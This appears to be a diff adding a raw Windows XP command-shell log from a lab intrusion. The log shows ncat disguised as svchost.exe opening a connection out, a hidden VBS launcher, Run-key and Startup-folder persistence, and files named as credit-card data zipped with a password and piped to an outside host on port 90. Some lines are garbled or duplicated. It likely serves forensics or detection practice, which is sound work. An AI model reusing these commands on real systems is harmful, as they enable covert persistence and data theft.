@@ -1,0 +1,362 @@
+Microsoft Windows XP [Version 5.1.2600]
+(C) Copyright 1985-2001 Microsoft Corp.
+
+C:\WINDOWS\system>
+C:\WINDOWS\system>C:\Users\SecurityNik\Downloads>svchost.exe 10.0.0.102 80 --nodns --ssl -4 
+
+C:\WINDOWS\system>echo > SUWtHEh_XP_ncat.vbs
+echo > SUWtHEh_XP_ncat.vbs
+
+C:\WINDOWS\system>dir SUWtHEh_XP_ncat.vbs
+dir SUWtHEh_XP_ncat.vbs
+ Volume in drive C has no label.
+ Volume Serial Number is D86F-1D13
+
+ Directory of C:\WINDOWS\system
+
+03/12/2018  03:01 AM                13 SUWtHEh_XP_ncat.vbs
+               1 File(s)             13 bytes
+               0 Dir(s)   6,713,962,496 bytes free
+
+C:\WINDOWS\system>echo Dim WShell >> SUWtHEh_XP_ncat.vbs
+echo Dim WShell >> SUWtHEh_XP_ncat.vbs
+
+C:\WINDOWS\system>echo Set WShell = CreateObject("WScript.Shell") >> SUWtHEh_XP_ncat.vbs
+echo Set WShell = CreateObject("WScript.Shell") >> SUWtHEh_XP_ncat.vbs
+
+C:\WINDOWS\system>echo WShell.Run "c:\windows\system\SUWtHEh_XP_VBS.vbs",0 >> SUWtHEh_XP_ncat.vbs
+echo WShell.Run "c:\windows\system\SUWtHEh_XP_VBS.vbs",0 >> SUWtHEh_XP_ncat.vbs
+
+C:\WINDOWS\system>echo Set WShell = Nothing >> SUWtHEh_XP_ncat.vbs
+echo Set WShell = Nothing >> SUWtHEh_XP_ncat.vbs
+
+C:\WINDOWS\system>type C:\WINDOWS\system>echo Dim WShell >> SUWtHEh_XP_ncat.vbs
+echo Dim WShell >> SUWtHEh_XP_ncat.vbs
+
+C:\WINDOWS\system>echo Set WShell = CreateObject("WScript.Shell") >> SUWtHEh_XP_ncat.vbs
+echo Set WShell = CreateObject("WScript.Shell") >> SUWtHEh_XP_ncat.vbs
+
+C:\WINDOWS\system>echo WShell.Run "c:\windows\system\SUWtHEh_XP_VBS.vbs",0 >> SUWtHEh_XP_ncat.vbs
+echo WShell.Run "c:\windows\system\SUWtHEh_XP_VBS.vbs",0 >> SUWtHEh_XP_ncat.vbs
+
+C:\WINDOWS\system>echo Set WShell = Nothing >> SUWtHEh_XP_ncat.vbs
+echo Set WShell = Nothing >> SUWtHEh_XP_ncat.vbs
+type C:\WINDOWS\system>echo Dim WShell >> SUWtHEh_XP_ncat.vbs
+
+C:\WINDOWS\system>echo Dim WShell >> SUWtHEh_XP_ncat.vbs
+
+C:\WINDOWS\system>
+C:\WINDOWS\system>C:\WINDOWS\system>echo Set WShell = CreateObject("WScript.Shell") >> SUWtHEh_XP_ncat.vbs
+
+C:\WINDOWS\system>echo Set WShell = CreateObject("WScript.Shell") >> SUWtHEh_XP_ncat.vbs
+
+C:\WINDOWS\system>
+C:\WINDOWS\system>C:\WINDOWS\system>echo WShell.Run "c:\windows\system\SUWtHEh_XP_VBS.vbs",0 >> SUWtHEh_XP_ncat.vbs
+
+C:\WINDOWS\system>echo WShell.Run "c:\windows\system\SUWtHEh_XP_VBS.vbs",0 >> SUWtHEh_XP_ncat.vbs
+
+C:\WINDOWS\system>
+C:\WINDOWS\system>C:\WINDOWS\system>echo Set WShell = Nothing >> SUWtHEh_XP_ncat.vbs
+
+C:\WINDOWS\system>echo Set WShell = Nothing >> SUWtHEh_XP_ncat.vbs
+
+C:\WINDOWS\system>type SUWtHEh_XP_ncat.vbs
+type SUWtHEh_XP_ncat.vbs
+ECHO is on.
+Dim WShell 
+Set WShell = CreateObject("WScript.Shell") 
+WShell.Run "c:\windows\system\SUWtHEh_XP_VBS.vbs",0 
+Set WShell = Nothing 
+Dim WShell 
+Set WShell = CreateObject("WScript.Shell") 
+WShell.Run "c:\windows\system\SUWtHEh_XP_VBS.vbs",0 
+Set WShell = Nothing 
+
+C:\WINDOWS\system>del SUWtHEh_XP_ncat.vbs
+del SUWtHEh_XP_ncat.vbs
+
+C:\WINDOWS\system>reg add HKLM\software\Microsoft\Windows\CurrentVersion\Run /t REG_SZ /v SUWtHEh_XP_ncat /d "wscript c:\windows\system\SUWtHEh-XP.vbs"
+reg add HKLM\software\Microsoft\Windows\CurrentVersion\Run /t REG_SZ /v SUWtHEh_XP_ncat /d "wscript c:\windows\system\SUWtHEh-XP.vbs"
+
+The operation completed successfully
+
+C:\WINDOWS\system>reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run
+reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run
+
+! REG.EXE VERSION 3.0
+
+HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run
+    VBoxTray	REG_SZ	C:\WINDOWS\system32\VBoxTray.exe
+    SUWtHEh_XP_ncat	REG_SZ	wscript c:\windows\system\SUWtHEh-XP.vbs
+
+C:\WINDOWS\system>reg add HKCU\software\Microsoft\Windows\CurrentVersion\Run /t REG_SZ /v SUWtHEh_XP_ncat /d "wscript c:\windows\system\SUWtHEh-XP.vbs"
+reg add HKCU\software\Microsoft\Windows\CurrentVersion\Run /t REG_SZ /v SUWtHEh_XP_ncat /d "wscript c:\windows\system\SUWtHEh-XP.vbs"
+Value SUWtHEh_XP_ncat exists, overwrite(Y/N)? Y
+
+The operation completed successfully
+
+C:\WINDOWS\system>reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run
+reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run
+
+! REG.EXE VERSION 3.0
+
+HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run
+    SUWtHEh_XP_ncat	REG_SZ	wscript c:\windows\system\SUWtHEh-XP.vbs
+
+C:\WINDOWS\system>C:\WINDOWS\system>copy SUWtHEh-XP.vbs "c:\Documents and Setti
+C:\WINDOWS\system>copy SUWtHEh-XP.vbs "c:\Documents and Setti
+
+C:\WINDOWS\system>copy SUWtHEh-XP.vbs "c:\Documents and Settings\All Users\Start Menu\Programs\Startup\"
+copy SUWtHEh-XP.vbs "c:\Documents and Settings\All Users\Start Menu\Programs\Startup\"
+        1 file(s) copied.
+
+C:\WINDOWS\system>dir c:\
+dir c:\
+ Volume in drive C has no label.
+ Volume Serial Number is D86F-1D13
+
+ Directory of c:\
+
+03/11/2018  03:40 AM    <DIR>          ARCHIVED-FILES
+12/30/2017  01:36 PM                 0 AUTOEXEC.BAT
+12/30/2017  01:36 PM                 0 CONFIG.SYS
+01/08/2018  12:31 AM    <DIR>          Dev-Cpp
+03/11/2018  02:59 AM    <DIR>          Documents and Settings
+02/02/2018  03:16 AM    <DIR>          Inetpub
+01/27/2018  06:06 PM    <DIR>          MySymbols
+01/04/2018  04:01 AM    <DIR>          New Folder
+03/09/2018  03:04 AM    <DIR>          Program Files
+01/04/2018  03:47 AM    <DIR>          Python27
+01/22/2018  02:57 AM               223 sc.txt
+01/09/2018  03:12 AM    <DIR>          TEST-FTP
+03/11/2018  06:16 PM    <DIR>          tmp
+03/12/2018  02:14 AM    <DIR>          WINDOWS
+               3 File(s)            223 bytes
+              11 Dir(s)   6,712,721,408 bytes free
+
+C:\WINDOWS\system>dir c:\archived-files\
+dir c:\archived-files\
+ Volume in drive C has no label.
+ Volume Serial Number is D86F-1D13
+
+ Directory of c:\archived-files
+
+03/11/2018  03:40 AM    <DIR>          .
+03/11/2018  03:40 AM    <DIR>          ..
+03/04/2018  02:09 AM         1,045,970 1-MB-Test.docx
+03/04/2018  02:10 AM        10,723,331 10-MB-Test.docx
+03/04/2018  02:09 AM        10,471,397 10-MB-Test.xlsx
+03/11/2018  03:40 AM    <DIR>          BIO-DATA
+03/04/2018  02:01 AM             4,748 Credit-Card-data.csv
+03/04/2018  02:02 AM           183,081 Credit-Card-data.pdf
+03/04/2018  02:02 AM            33,792 Credit-Card-data.xls
+03/04/2018  02:07 AM           219,783 data1.xlsx
+03/11/2018  03:40 AM    <DIR>          HISTORICAL-DATA
+               7 File(s)     22,682,102 bytes
+               4 Dir(s)   6,712,721,408 bytes free
+
+C:\WINDOWS\system>7za.exe a -y -r -tzip  -p XP-data.zip c:\ARCHIVED-FILES\*
+7za.exe a -y -r -tzip  -p XP-data.zip c:\ARCHIVED-FILES\*
+
+7-Zip (A) 9.20  Copyright (c) 1999-2010 Igor Pavlov  2010-11-18
+Scanning
+
+Creating archive XP-data.zip
+
+
+Enter password (will not be echoed):Testing1
+
+Compressing  1-MB-Test.docx
+Compressing  10-MB-Test.docx
+Compressing  10-MB-Test.xlsx
+Compressing  Credit-Card-data.csv
+Compressing  Credit-Card-data.pdf
+Compressing  Credit-Card-data.xls
+Compressing  data1.xlsx
+
+Everything is Ok
+
+C:\WINDOWS\system>svchost --nodns --verbose 172.16.1.2 90 < c:\tmp\XP-data.zip
+svchost --nodns --verbose 172.16.1.2 90 < c:\tmp\XP-data.zip
+
+C:\WINDOWS\system>[A[B
+[A[B
+
+C:\WINDOWS\system>dir
+dir
+ Volume in drive C has no label.
+ Volume Serial Number is D86F-1D13
+
+ Directory of C:\WINDOWS\system
+
+03/12/2018  03:18 AM    <DIR>          .
+03/12/2018  03:18 AM    <DIR>          ..
+03/12/2018  03:16 AM           587,776 7za.exe
+04/14/2008  08:00 AM            69,584 AVICAP.DLL
+04/14/2008  08:00 AM           109,456 AVIFILE.DLL
+04/14/2008  08:00 AM            32,816 COMMDLG.DLL
+03/12/2018  03:14 AM                 0 copy
+03/12/1997  12:00 AM           194,736 JSCRPT16.DLL
+04/14/2008  08:00 AM             2,000 KEYBOARD.DRV
+04/14/2008  08:00 AM             9,936 LZEXPAND.DLL
+04/14/2008  08:00 AM            73,376 MCIAVI.DRV
+04/14/2008  08:00 AM            25,264 MCISEQ.DRV
+04/14/2008  08:00 AM            28,160 MCIWAVE.DRV
+04/14/2008  08:00 AM            68,768 MMSYSTEM.DLL
+04/14/2008  08:00 AM             1,152 MMTASK.TSK
+04/14/2008  08:00 AM             2,032 MOUSE.DRV
+04/14/2008  08:00 AM           126,912 MSVIDEO.DLL
+04/14/2008  08:00 AM            82,944 OLECLI.DLL
+04/14/2008  08:00 AM            24,064 OLESVR.DLL
+03/12/1997  12:00 AM           141,456 SCHNL16.DLL
+04/14/2008  08:00 AM            59,167 setup.inf
+04/14/2008  08:00 AM             5,120 SHELL.DLL
+04/14/2008  08:00 AM             1,744 SOUND.DRV
+04/14/2008  08:00 AM             5,532 stdole.tlb
+03/11/2018  04:39 PM                43 SUtype
+03/12/2018  03:07 AM               173 SUWtHEh-XP.vbs
+03/12/2018  02:23 AM                43 SUWtHEh.bat
+03/12/2018  02:21 AM         1,667,584 svchost.exe
+04/14/2008  08:00 AM             3,360 SYSTEM.DRV
+04/14/2008  08:00 AM            19,200 TAPI.DLL
+04/14/2008  08:00 AM             4,048 TIMER.DRV
+04/14/2008  08:00 AM             9,008 VER.DLL
+04/14/2008  08:00 AM             2,176 VGA.DRV
+04/14/2008  08:00 AM            13,600 WFWNET.DRV
+04/14/2008  08:00 AM           146,432 WINSPOOL.DRV
+03/12/2018  03:18 AM        19,640,434 XP-data.zip
+              34 File(s)     23,158,096 bytes
+               2 Dir(s)   6,693,003,264 bytes free
+
+C:\WINDOWS\system>dir XP*.*
+dir XP*.*
+ Volume in drive C has no label.
+ Volume Serial Number is D86F-1D13
+
+ Directory of C:\WINDOWS\system
+
+03/12/2018  03:18 AM        19,640,434 XP-data.zip
+               1 File(s)     19,640,434 bytes
+               0 Dir(s)   6,693,003,264 bytes free
+
+C:\WINDOWS\system>svchost --nodns --verbose 172.16.1.1 90 < c:\tmp\XP-data.zip
+svchost --nodns --verbose 172.16.1.1 90 < c:\tmp\XP-data.zip
+
+C:\WINDOWS\system>svchost --nodns --verbose 172.16.1.1 90 < c:\tmp\XP-data.zip
+svchost --nodns --verbose 172.16.1.1 90 < c:\tmp\XP-data.zip
+
+C:\WINDOWS\system>
+
+C:\WINDOWS\system>dir
+dir
+ Volume in drive C has no label.
+ Volume Serial Number is D86F-1D13
+
+ Directory of C:\WINDOWS\system
+
+03/12/2018  03:18 AM    <DIR>          .
+03/12/2018  03:18 AM    <DIR>          ..
+03/12/2018  03:16 AM           587,776 7za.exe
+04/14/2008  08:00 AM            69,584 AVICAP.DLL
+04/14/2008  08:00 AM           109,456 AVIFILE.DLL
+04/14/2008  08:00 AM            32,816 COMMDLG.DLL
+03/12/2018  03:14 AM                 0 copy
+03/12/1997  12:00 AM           194,736 JSCRPT16.DLL
+04/14/2008  08:00 AM             2,000 KEYBOARD.DRV
+04/14/2008  08:00 AM             9,936 LZEXPAND.DLL
+04/14/2008  08:00 AM            73,376 MCIAVI.DRV
+04/14/2008  08:00 AM            25,264 MCISEQ.DRV
+04/14/2008  08:00 AM            28,160 MCIWAVE.DRV
+04/14/2008  08:00 AM            68,768 MMSYSTEM.DLL
+04/14/2008  08:00 AM             1,152 MMTASK.TSK
+04/14/2008  08:00 AM             2,032 MOUSE.DRV
+04/14/2008  08:00 AM           126,912 MSVIDEO.DLL
+04/14/2008  08:00 AM            82,944 OLECLI.DLL
+04/14/2008  08:00 AM            24,064 OLESVR.DLL
+03/12/1997  12:00 AM           141,456 SCHNL16.DLL
+04/14/2008  08:00 AM            59,167 setup.inf
+04/14/2008  08:00 AM             5,120 SHELL.DLL
+04/14/2008  08:00 AM             1,744 SOUND.DRV
+04/14/2008  08:00 AM             5,532 stdole.tlb
+03/11/2018  04:39 PM                43 SUtype
+03/12/2018  03:07 AM               173 SUWtHEh-XP.vbs
+03/12/2018  02:23 AM                43 SUWtHEh.bat
+03/12/2018  02:21 AM         1,667,584 svchost.exe
+04/14/2008  08:00 AM             3,360 SYSTEM.DRV
+04/14/2008  08:00 AM            19,200 TAPI.DLL
+04/14/2008  08:00 AM             4,048 TIMER.DRV
+04/14/2008  08:00 AM             9,008 VER.DLL
+04/14/2008  08:00 AM             2,176 VGA.DRV
+04/14/2008  08:00 AM            13,600 WFWNET.DRV
+04/14/2008  08:00 AM           146,432 WINSPOOL.DRV
+03/12/2018  03:18 AM        19,640,434 XP-data.zip
+              34 File(s)     23,158,096 bytes
+               2 Dir(s)   6,692,737,024 bytes free
+
+C:\WINDOWS\system>dir
+dir
+ Volume in drive C has no label.
+ Volume Serial Number is D86F-1D13
+
+ Directory of C:\WINDOWS\system
+
+03/12/2018  03:18 AM    <DIR>          .
+03/12/2018  03:18 AM    <DIR>          ..
+03/12/2018  03:16 AM           587,776 7za.exe
+04/14/2008  08:00 AM            69,584 AVICAP.DLL
+04/14/2008  08:00 AM           109,456 AVIFILE.DLL
+04/14/2008  08:00 AM            32,816 COMMDLG.DLL
+03/12/2018  03:14 AM                 0 copy
+03/12/1997  12:00 AM           194,736 JSCRPT16.DLL
+04/14/2008  08:00 AM             2,000 KEYBOARD.DRV
+04/14/2008  08:00 AM             9,936 LZEXPAND.DLL
+04/14/2008  08:00 AM            73,376 MCIAVI.DRV
+04/14/2008  08:00 AM            25,264 MCISEQ.DRV
+04/14/2008  08:00 AM            28,160 MCIWAVE.DRV
+04/14/2008  08:00 AM            68,768 MMSYSTEM.DLL
+04/14/2008  08:00 AM             1,152 MMTASK.TSK
+04/14/2008  08:00 AM             2,032 MOUSE.DRV
+04/14/2008  08:00 AM           126,912 MSVIDEO.DLL
+04/14/2008  08:00 AM            82,944 OLECLI.DLL
+04/14/2008  08:00 AM            24,064 OLESVR.DLL
+03/12/1997  12:00 AM           141,456 SCHNL16.DLL
+04/14/2008  08:00 AM            59,167 setup.inf
+04/14/2008  08:00 AM             5,120 SHELL.DLL
+04/14/2008  08:00 AM             1,744 SOUND.DRV
+04/14/2008  08:00 AM             5,532 stdole.tlb
+03/11/2018  04:39 PM                43 SUtype
+03/12/2018  03:07 AM               173 SUWtHEh-XP.vbs
+03/12/2018  02:23 AM                43 SUWtHEh.bat
+03/12/2018  02:21 AM         1,667,584 svchost.exe
+04/14/2008  08:00 AM             3,360 SYSTEM.DRV
+04/14/2008  08:00 AM            19,200 TAPI.DLL
+04/14/2008  08:00 AM             4,048 TIMER.DRV
+04/14/2008  08:00 AM             9,008 VER.DLL
+04/14/2008  08:00 AM             2,176 VGA.DRV
+04/14/2008  08:00 AM            13,600 WFWNET.DRV
+04/14/2008  08:00 AM           146,432 WINSPOOL.DRV
+03/12/2018  03:18 AM        19,640,434 XP-data.zip
+              34 File(s)     23,158,096 bytes
+               2 Dir(s)   6,692,671,488 bytes free
+
+C:\WINDOWS\system>dir XP*.*
+dir XP*.*
+ Volume in drive C has no label.
+ Volume Serial Number is D86F-1D13
+
+ Directory of C:\WINDOWS\system
+
+03/12/2018  03:18 AM        19,640,434 XP-data.zip
+               1 File(s)     19,640,434 bytes
+               0 Dir(s)   6,692,671,488 bytes free
+
+C:\WINDOWS\system>svchost --nodns --verbose --listen 172.16.1.1 90 < XP-data.zip
+svchost --nodns --verbose --listen 172.16.1.1 90 < XP-data.zip
+
+C:\WINDOWS\system>svchost --nodns --verbose 172.16.1.1 90 < XP-data.zip
+svchost --nodns --verbose 172.16.1.1 90 < XP-data.zip
+
+C:\WINDOWS\system>svchost.exe --nodns --verbose 172.16.1.1 90 < XP-data.zip
+svchost.exe --nodns --verbose 172.16.1.1 90 < XP-data.zip
+
+C:\WINDOWS\system>
